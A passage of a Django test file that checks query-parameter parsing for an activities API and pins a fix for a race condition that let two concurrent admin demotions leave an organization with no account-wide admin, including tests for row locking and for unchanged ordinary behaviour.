        """Passes both ways, deliberately — the guard against a "fix" that
        drops the parameter on the floor instead of parsing it."""
        other = Property.objects.create(
            organization=self.org,
            name="Other Property",
            boundary=Polygon(((5, 5), (5, 6), (6, 6), (6, 5), (5, 5))),
        )
        state = WorkflowState.objects.filter(organization=self.org).first()
        activity_type = ActivityType.objects.filter(organization=self.org).first()
        Activity.objects.create(
            organization=self.org,
            property=other,
            activity_type=activity_type,
            status=state,
            geometry=Polygon(((5, 5), (5, 6), (6, 6), (6, 5), (5, 5))),
        )

        mine = self.client.get(f"/api/activities/?property={self.property.id}")
        theirs = self.client.get(f"/api/activities/?property={other.id}")

        self.assertEqual(mine.status_code, 200)
        self.assertEqual(theirs.status_code, 200)
        self.assertEqual(len(mine.json()["features"]), 0)
        self.assertEqual(
            len(theirs.json()["features"]),
            1,
            "the parameter must still select, not be ignored",
        )

    def test_an_empty_property_param_still_means_no_filter(self):
        """Passes both ways, deliberately. `?property=` (empty) has always
        meant "no filter", and the parsed version must not turn it into a
        400 — hence int_query_param returns None for empty as well as
        absent, and callers test `is not None` rather than truthiness."""
        response = self.client.get("/api/activities/?property=")
        self.assertEqual(response.status_code, 200)

    def test_the_error_names_the_offending_parameter(self):
        """A 400 whose body doesn't say which parameter was wrong is only
        marginally better than the 500 it replaced."""
        response = self.client.get("/api/activities/?property=NaN")
        self.assertEqual(response.status_code, 400)
        self.assertIn("property", response.json())


# --- 5. The last-account-wide-admin guard can't be raced (D16) ---
#
# Found 2026-09-09. MembershipViewSet.partial_update and .destroy both
# refuse to remove an organization's last *account-wide* admin — the state
# _account_wide_admin_count's docstring calls unrecoverable, since an org
# holding only property-scoped admins can no longer rename itself, manage
# account-wide members, invite, or work its feedback queue.
#
# Both guards were check-then-act with nothing held between the check and
# the write, and settings.py sets no ATOMIC_REQUESTS, so each statement
# autocommitted on its own. Two admins demoting *each other* at the same
# moment therefore both read a count of 2, both passed the guard, and both
# wrote — landing in exactly the state the guard exists to prevent. No
# attacker is needed: two admins tidying up membership at once, or one
# admin with two tabs, is enough.
#
# What is pinned here, and why the split matters:
#
#   * The concurrent tests are the defect. They fail against the pre-fix
#     code because the org really does end up with zero account-wide
#     admins.
#   * `test_the_demote_path_locks_the_organization_row` pins the
#     *mechanism* — that a row lock is actually taken. A race that happens
#     to serialize on a fast machine would let the concurrent tests pass
#     against broken code; this one cannot.
#   * The sequential tests pass both ways on purpose. They guard against a
#     "fix" that makes the guard fire when it shouldn't (or stops the
#     endpoint working at all), which is the failure mode D10 already hit
#     once on this exact guard.


def _make_account_wide_admin(organization, email):
    user = User.objects.create_user(email=email, password="pw-for-testing-123")
    Membership.objects.create(
        user=user, organization=organization, role=Membership.Role.ADMIN
    )
    return user


def _account_wide_admins(organization):
    return (
        Membership.objects.filter(
            organization=organization,
            role=Membership.Role.ADMIN,
            properties__isnull=True,
        )
        .distinct()
        .count()
    )


class LastAdminGuardConcurrencyTests(TransactionTestCase):
    """TransactionTestCase, not TestCase: the race only exists across real
    committed transactions, and TestCase would wrap the whole test in one."""

    def setUp(self):
        self.organization = Organization.objects.create(name="Two Admins")
        self.alice = _make_account_wide_admin(self.organization, "alice@example.com")
        self.bob = _make_account_wide_admin(self.organization, "bob@example.com")
        self.alice_membership = Membership.objects.get(user=self.alice)
        self.bob_membership = Membership.objects.get(user=self.bob)
        self.assertEqual(_account_wide_admins(self.organization), 2)

    def _demote_concurrently(self, first_target, second_target):
        """Runs two demotions at once, forcing the interleaving that makes
        the race observable rather than hoping the scheduler produces it:
        whichever request reads the admin count first is held there briefly,
        which is precisely the window the missing lock left open.

        With the lock in place the second request never reaches the count
        until the first has committed, so it re-reads a count of 1 and
        refuses — the sleep just makes it wait."""
        from django.db import connection as default_connection

        from apps.accounts import views as accounts_views

        real_count = accounts_views._account_wide_admin_count
        state = {"seen": 0}
        state_lock = threading.Lock()

        def counting_first_caller_sleeps(organization):
            result = real_count(organization)
            with state_lock:
                first = state["seen"] == 0
                state["seen"] += 1
            if first:
                time.sleep(1.0)
            return result

        results = {}

        def demote(actor, target_membership, label):
            try:
                client = Client()
                client.force_login(actor)
                response = client.patch(
                    f"/api/org/members/{target_membership.id}/",
                    data=json.dumps({"role": Membership.Role.VIEWER}),
                    content_type="application/json",
                )
                results[label] = response.status_code
            finally:
                from django.db import connections

                connections.close_all()

        accounts_views._account_wide_admin_count = counting_first_caller_sleeps
        try:
            threads = [
                threading.Thread(target=demote, args=(self.alice, first_target, "first")),
                threading.Thread(target=demote, args=(self.bob, second_target, "second")),
            ]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join(timeout=30)
            for thread in threads:
                self.assertFalse(thread.is_alive(), "a request deadlocked")
        finally:
            accounts_views._account_wide_admin_count = real_count
            default_connection.close()

        return results

    def test_two_admins_demoting_each_other_cannot_empty_the_organization(self):
        """The defect itself. Pre-fix both requests return 200 and the
        organization is left with no account-wide admin at all."""
        results = self._demote_concurrently(self.bob_membership, self.alice_membership)

        remaining = _account_wide_admins(self.organization)
        self.assertGreaterEqual(
            remaining,
            1,
            "an organization must never be left with zero account-wide admins: "
            f"concurrent demotions returned {sorted(results.values())}",
        )

    def test_exactly_one_of_the_two_demotions_is_refused(self):
        """The other half: the survivor isn't luck, it's the guard firing on
        the second request once it can see the first one's write."""
        results = self._demote_concurrently(self.bob_membership, self.alice_membership)

        self.assertEqual(
            sorted(results.values()),
            [200, 400],
            "one demotion should succeed and the other be refused",
        )


class LastAdminGuardMechanismTests(TestCase):
    def setUp(self):
        self.organization = Organization.objects.create(name="Two Admins")
        self.alice = _make_account_wide_admin(self.organization, "alice@example.com")
        self.bob = _make_account_wide_admin(self.organization, "bob@example.com")
        self.bob_membership = Membership.objects.get(user=self.bob)
        self.client.force_login(self.alice)

    def test_the_demote_path_locks_the_organization_row(self):
        """Pins the mechanism, not the outcome. The concurrent tests above
        could pass against unfixed code on a machine that happened to
        serialize the two requests; this one asserts the lock is actually
        taken, so it can't."""
        with CaptureQueriesContext(connection) as queries:
            response = self.client.patch(
                f"/api/org/members/{self.bob_membership.id}/",
                data=json.dumps({"role": Membership.Role.VIEWER}),
                content_type="application/json",
            )
        self.assertEqual(response.status_code, 200)
        locked = [
            q["sql"]
            for q in queries.captured_queries
            if "FOR UPDATE" in q["sql"].upper() and "ACCOUNTS_ORGANIZATION" in q["sql"].upper()
        ]
        self.assertTrue(
            locked,
            "demoting an admin must lock the organization row; no SELECT ... FOR "
            "UPDATE on accounts_organization was issued",
        )

    def test_the_delete_path_locks_the_organization_row(self):
        with CaptureQueriesContext(connection) as queries:
            response = self.client.delete(f"/api/org/members/{self.bob_membership.id}/")
        self.assertEqual(response.status_code, 204)
        locked = [
            q["sql"]
            for q in queries.captured_queries
            if "FOR UPDATE" in q["sql"].upper() and "ACCOUNTS_ORGANIZATION" in q["sql"].upper()
        ]
        self.assertTrue(locked, "removing an admin must lock the organization row")


class LastAdminGuardStillWorksTests(TestCase):
    """These pass both before and after the fix, deliberately. The guard
    already broke once by firing on a membership it was never meant to
    protect (D10), so a change to it needs the ordinary paths pinned, not
    just the race."""

    def setUp(self):
        self.organization = Organization.objects.create(name="One Admin")
        self.alice = _make_account_wide_admin(self.organization, "alice@example.com")
        self.alice_membership = Membership.objects.get(user=self.alice)
        self.client.force_login(self.alice)

    def test_the_only_account_wide_admin_cannot_demote_themselves(self):
        response = self.client.patch(
            f"/api/org/members/{self.alice_membership.id}/",
            data=json.dumps({"role": Membership.Role.VIEWER}),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 400)
        self.assertEqual(_account_wide_admins(self.organization), 1)

    def test_the_only_account_wide_admin_cannot_be_removed(self):
        response = self.client.delete(f"/api/org/members/{self.alice_membership.id}/")
        self.assertEqual(response.status_code, 400)
        self.assertEqual(_account_wide_admins(self.organization), 1)

    def test_one_of_two_account_wide_admins_can_still_be_demoted(self):
        """The guard must not become "no admin may ever be demoted"."""
        bob = _make_account_wide_admin(self.organization, "bob@example.com")
        bob_membership = Membership.objects.get(user=bob)

        response = self.client.patch(
            f"/api/org/members/{bob_membership.id}/",
            data=json.dumps({"role": Membership.Role.VIEWER}),
            content_type="application/json",
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(_account_wide_admins(self.organization), 1)

    def test_a_non_admin_member_can_still_be_removed(self):
        viewer_user = User.objects.create_user(
            email="viewer@example.com", password="pw-for-testing-123"
        )
        viewer = Membership.objects.create(
            user=viewer_user, organization=self.organization, role=Membership.Role.VIEWER
        )

        response = self.client.delete(f"/api/org/members/{viewer.id}/")
        self.assertEqual(response.status_code, 204)
        self.assertEqual(_account_wide_admins(self.organization), 1)
